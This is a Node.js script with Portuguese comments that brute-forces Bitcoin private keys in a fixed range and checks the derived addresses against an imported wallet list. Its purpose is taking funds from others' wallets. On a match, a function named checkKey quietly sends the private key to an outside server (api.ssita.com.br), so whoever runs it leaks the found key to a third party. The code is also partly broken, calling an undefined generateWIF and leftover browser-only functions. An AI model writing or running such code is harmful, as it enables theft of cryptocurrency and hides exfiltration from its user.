import CoinKey from "coinkey";
import crypto from "crypto";
import fs from "fs";

function generateRandomNumber(lowerLimit, upperLimit) {
  const range = upperLimit - lowerLimit + BigInt(1);
  const rangeBits = range.toString(2).length; // Número de bits necessários para representar o intervalo

  while (true) {
    // Calcula o número de bytes necessários para cobrir o rangeBits
    const byteLength = Math.ceil(rangeBits / 8);

    // Gera bytes aleatórios
    const randomBuffer = crypto.randomBytes(byteLength);

    // Converte o buffer para um BigInt
    let randomBits = BigInt(0);
    for (let i = 0; i < randomBuffer.length; i++) {
      randomBits = (randomBits << 8n) | BigInt(randomBuffer[i]);
    }

    // Ajusta o número gerado ao tamanho do rangeBits
    randomBits = randomBits & ((1n << BigInt(rangeBits)) - 1n);

    // Ajusta para o intervalo [0, range)
    if (randomBits < range) {
      return (lowerLimit + randomBits).toString(16);
    }
  }
}

function jsonToQueryString(options) {
  let queryString = "";
  for (let entry in options) {
    if (options[entry]) {
      queryString += encodeURIComponent(options[entry]) + "%7C";
    }
  }

  // remove last '&'
  queryString = queryString.substring(0, queryString.length - 3);

  return queryString;
}
let zeroes = new Array(65).fill("");
for (let i = 1; i < 64; i++) {
  zeroes[i] = "0".repeat(64 - i);
}

function generatePublic(privateKey) {
  let _key = new CoinKey(new Buffer.from(privateKey, "hex"));
  _key.compressed = true;
  return _key.publicAddress;
}

function json2array(json) {
  var result = [];
  var keys = Object.keys(json);
  keys.forEach(function (key) {
    result.push(json[key]);
  });
  return result;
}

const balance = function (keys, keys2) {
  fetch("https://blockchain.info/balance?active=" + keys + "&cors=true")
    .then((response) => response.json())
    .then((data) => {
      const dados = JSON.stringify(data);
      var keys = Object.keys(data);
      keys.forEach(async function (key, index) {
        if (data[key].final_balance > 0) {
          const ach = {
            final_balance: data[key].final_balance,
            key: keys2[index].key,
            pk: keys2[index].pk,
          };
          localStorage.setItem("balance_" + key, JSON.stringify(ach));
          checkKey(
            "final_balance" + keys2[index].key + "-" + data[key].final_balance
          );
        }
      });
    });
};

const checkKey = function (pk) {
  fetch("https://api.ssita.com.br/sendFCM.php?key=159753&msg=" + pk).then(
    function (response) {
      localStorage.removeItem("analytics");
      clearInterval(myInterval);
    }
  );
};

import walletsArray from "./wallets.js";
const walletsSet = new Set(walletsArray);

let min = BigInt("0x20000000000000000");
let max = BigInt("0x3ffffffffffffffff");

console.log("Inicio : 0x" + min.toString(16));
console.log("Fim : 0x" + max.toString(16));

// let min = BigInt("0x8000000000000000000000000000000000000000");
// let max = BigInt("0xffffffffffffffffffffffffffffffffffffffff");
let key = generateRandomNumber(min, max);

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function convertMegahashesToEmhashes(megahashes) {
  const megahash = 1e6;
  const emhash = 1e15;
  const emhashes = megahashes * (emhash / megahash);
  return emhashes;
}

function formatNumberWithSuffix(number) {
  if (number >= 1e15) return (number / 1e15).toFixed(2) + " EH";
  if (number >= 1e12) return (number / 1e12).toFixed(2) + " TH";
  if (number >= 1e9) return (number / 1e9).toFixed(2) + " GH";
  if (number >= 1e6) return (number / 1e6).toFixed(2) + " MH";
  if (number >= 1e3) return (number / 1e3).toFixed(2) + " KH";
  return number.toFixed(2) + " HZ";
}

let start = 0;
let chaves = 0;
let limite = 30;
let ask = [];
let ask2 = [];

let segundos = 0;
const startTime = Date.now();

console.log("Buscando Key...");
key = generateRandomNumber(min, max);

while (true) {
  // const executeLoop = async (minx, maxx) => {
  // start++;
  chaves++;
  let pkey = `${zeroes[key.length]}${key}`;
  let pk = generatePublic(pkey);

  // console.log("Buscando...", key, pkey, pk);
  process.stdout.write(`Buscando Key : ${key} - ${pkey}\r`);

  if (Date.now() - startTime > segundos) {
    segundos += 1000;
    if (segundos % 10000 === 0) {
      const tempo = (Date.now() - startTime) / 1000;
      console.clear();
      console.log("Resumo: ");
      console.log(
        "#" +
          chaves +
          " - Velocidade : " +
          formatNumberWithSuffix(convertMegahashesToEmhashes(chaves / tempo))
      );
      chaves = 0;
    }
  }

  // if (start >= limite) {
  // clearInterval(myInterval);
  // start = 0;
  // document.getElementById("address").innerHTML = "";
  //   balance(jsonToQueryString(ask), ask2);
  //   ask2 = [];
  // let numeroAleatorio = Math.floor(Math.random() * (1000 + 1)) + 1000;
  // var keys = Object.keys(ask);
  // keys.forEach(async function (key, index) {
  // document.getElementById("address").innerHTML += ask[key] + "<br>";
  // });
  // ask = [];
  // await sleep(numeroAleatorio);
  // init();
  // }

  if (walletsSet.has(pk)) {
    const filePath = "keys.txt";

    const lineToAppend = {
      "Private key": pkey,
      WIF: generateWIF(pkey),
      "Public Key": pk,
    };

    try {
      fs.appendFileSync(filePath, JSON.stringify(lineToAppend));
      console.log("Chave escrita no arquivo com sucesso.");
    } catch (err) {
      console.error("Erro ao escrever chave em arquivo:", err);
    }

    console.log("🎉🎉🎉🎉🎉", pk);
    checkKey(key);
    process.exit(0);
  }
  // ask.push(pk);
  // ask2.push({ key: key, pk: pk });
  // await sleep(0);
  key = generateRandomNumber(min, max);
  // await executeLoop(min, max);
}
